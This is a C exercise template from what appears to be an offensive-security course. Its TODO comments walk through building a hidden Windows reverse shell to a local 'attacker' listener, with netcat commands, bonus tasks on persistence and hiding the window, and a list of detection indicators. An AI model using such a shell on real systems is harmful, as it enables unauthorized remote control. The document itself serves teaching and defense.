/*
 * Exercise 03: Simple Reverse Shell
 *
 * EDUCATIONAL PURPOSE ONLY - FOR AUTHORIZED TESTING ONLY
 *
 * OBJECTIVE:
 * Create a basic reverse shell that:
 * 1. Connects to attacker at 127.0.0.1:4444
 * 2. Spawns cmd.exe with I/O redirected to socket
 * 3. Provides interactive shell to attacker
 * 4. Exits cleanly when shell terminates
 *
 * TASKS:
 * - Initialize Winsock
 * - Create and connect socket
 * - Setup STARTUPINFO with redirected handles
 * - Spawn cmd.exe using CreateProcess
 * - Wait for process to exit
 * - Cleanup all resources
 *
 * TESTING:
 * 1. Start listener:
 *    nc -lvp 4444
 *
 * 2. Run your reverse shell:
 *    ex03-simple-revshell.exe
 *
 * 3. In netcat, type commands:
 *    dir
 *    whoami
 *    ipconfig
 *    exit
 *
 * SECURITY WARNING:
 * This is a REAL reverse shell. Only use on systems you own
 * or have explicit authorization to test. Unauthorized use
 * is ILLEGAL.
 *
 * IMPORTANT CONCEPTS:
 * - Handle inheritance (bInheritHandles = TRUE)
 * - I/O redirection with STARTF_USESTDHANDLES
 * - Hiding window with SW_HIDE
 * - Proper process cleanup
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

#define ATTACKER_IP "127.0.0.1"
#define ATTACKER_PORT 4444

int main(void) {
    /* TODO: Declare variables
     * - WSADATA
     * - SOCKET
     * - struct sockaddr_in
     * - STARTUPINFOA
     * - PROCESS_INFORMATION
     * - int result
     */

    printf("[!] Reverse Shell Exercise - EDUCATIONAL ONLY\n");
    printf("[!] Only use on authorized systems\n\n");

    /* TODO: Initialize Winsock */

    /* TODO: Create socket */

    /* TODO: Setup attacker address
     * - sin_family = AF_INET
     * - sin_port = htons(ATTACKER_PORT)
     * - sin_addr from inet_pton()
     */

    /* TODO: Connect to attacker
     * - Print connecting message
     * - connect() to attacker
     * - Handle connection failure with helpful message
     */

    /* TODO: Setup STARTUPINFO
     * - ZeroMemory(&si, sizeof(si))
     * - si.cb = sizeof(si)
     * - si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
     * - si.wShowWindow = SW_HIDE
     * - si.hStdInput = (HANDLE)sock
     * - si.hStdOutput = (HANDLE)sock
     * - si.hStdError = (HANDLE)sock
     */

    /* TODO: Initialize PROCESS_INFORMATION
     * - ZeroMemory(&pi, sizeof(pi))
     */

    /* TODO: Create process
     * - CreateProcessA() to spawn "cmd.exe"
     * - CRITICAL: Set bInheritHandles to TRUE
     * - Check return value
     * - Handle errors
     */

    /* TODO: Wait for process to exit
     * - Use WaitForSingleObject()
     * - Wait on pi.hProcess
     * - Use INFINITE timeout
     */

    /* TODO: Cleanup process handles
     * - CloseHandle(pi.hProcess)
     * - CloseHandle(pi.hThread)
     */

    /* TODO: Cleanup socket and Winsock
     * - closesocket()
     * - WSACleanup()
     */

    printf("[+] Reverse shell exited cleanly\n");
    return 0;
}

/*
 * EXPECTED FLOW:
 *
 * 1. Program starts
 * 2. Connects to attacker
 * 3. Spawns cmd.exe
 * 4. Attacker can now type commands
 * 5. Attacker types "exit"
 * 6. cmd.exe terminates
 * 7. Program cleans up
 *
 * ATTACKER VIEW (in netcat):
 * Listening on 0.0.0.0 4444
 * Connection received on 127.0.0.1 xxxxx
 * Microsoft Windows [Version ...]
 * C:\path\to\current\dir>
 *
 * C:\path\to\current\dir>whoami
 * COMPUTER\username
 *
 * C:\path\to\current\dir>exit
 *
 * DEBUGGING TIPS:
 * - If connection fails: Check if listener is running
 * - If no shell: Verify handle redirection
 * - If process doesn't start: Check CreateProcess return
 * - If can't see output: Ensure handles are inherited
 *
 * COMMON MISTAKES:
 * 1. Forgetting bInheritHandles = TRUE
 *    Result: cmd.exe can't use redirected handles
 *
 * 2. Not casting SOCKET to HANDLE
 *    Result: Invalid handles in STARTUPINFO
 *
 * 3. Forgetting to wait for process
 *    Result: Program exits immediately
 *
 * 4. Not closing process handles
 *    Result: Resource leak
 *
 * BONUS CHALLENGES:
 * 1. Add retry logic if connection fails
 * 2. Implement persistence (restart if shell dies)
 * 3. Change cmd.exe to powershell.exe
 * 4. Add encryption (TLS/SSL - see later weeks)
 * 5. Hide console window completely
 *
 * DETECTION INDICATORS:
 * - Outbound connection to unusual port
 * - cmd.exe with redirected I/O handles
 * - Network traffic from cmd.exe process
 * - Process tree anomaly (your.exe -> cmd.exe)
 *
 * DEFENSIVE CONSIDERATIONS:
 * How would you detect this on a real system?
 * - Monitor outbound connections
 * - Alert on cmd.exe with redirected handles
 * - Process parent-child relationship analysis
 * - Network behavioral analysis
 *
 * GRADING CRITERIA:
 * [ ] Connects to attacker successfully
 * [ ] Spawns cmd.exe correctly
 * [ ] Handles are properly redirected
 * [ ] Interactive shell works
 * [ ] Exits cleanly when done
 * [ ] Proper error handling
 * [ ] All resources cleaned up
 */
